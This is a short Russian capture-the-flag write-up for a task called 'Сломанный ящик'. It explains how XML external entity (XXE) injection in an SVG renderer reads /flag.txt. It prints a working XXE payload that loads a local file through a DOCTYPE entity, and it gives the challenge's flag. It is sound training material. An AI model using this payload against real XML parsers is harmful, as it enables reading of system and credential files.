# Сломанный ящик: Write-up #
Попадая на сайт, видим окошко с xml-кодом и окошко, в котором он рендерится. Судя по описанию, нам нужно как-то отрендерить файл `/flag.txt`.
В хинте сказано про некие "внешние сущности", т.е. "Eternal entities", гугл на эту тему даёт нам определение [XXE](https://habr.com/ru/companies/vds/articles/454614/).

Суть заключается в том, что мы через элемент `DOCTYPE` подгрузим файл, который потом отрендерим в элементе `svg` как текст:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
```
Можно убрать из примера кодв лишние кружочки и квадратики, тогда код будет выглядеть так:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg version = "1.1"
        baseProfile="full"
        xmlns = "http://www.w3.org/2000/svg" 
        xmlns:xlink = "http://www.w3.org/1999/xlink"
        xmlns:ev = "http://www.w3.org/2001/xml-events"
        height = "400px"  width = "400px">
<text x="20" y="35" class="small">&xxe;</text>
</svg>
```
Загружаем и получаем флаг: `CCODEBY{xmldestroyer31}`
